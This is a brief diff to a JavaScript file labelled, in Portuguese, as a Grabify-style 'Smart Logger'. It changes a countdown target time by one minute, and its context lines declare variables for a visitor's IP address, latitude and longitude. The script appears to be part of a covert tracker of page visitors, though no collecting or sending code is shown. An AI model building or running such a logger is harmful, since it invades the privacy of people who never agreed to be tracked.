@@ -1,6 +1,6 @@
 // script.js - Versão Smart Logger (estilo Grabify)
 
-let targetDate = new Date("2026-04-20T01:32:59").getTime();
+let targetDate = new Date("2026-04-20T01:33:59").getTime();
 let userIPv4 = '';
 let userLatitude = '';
 let userLongitude = '';
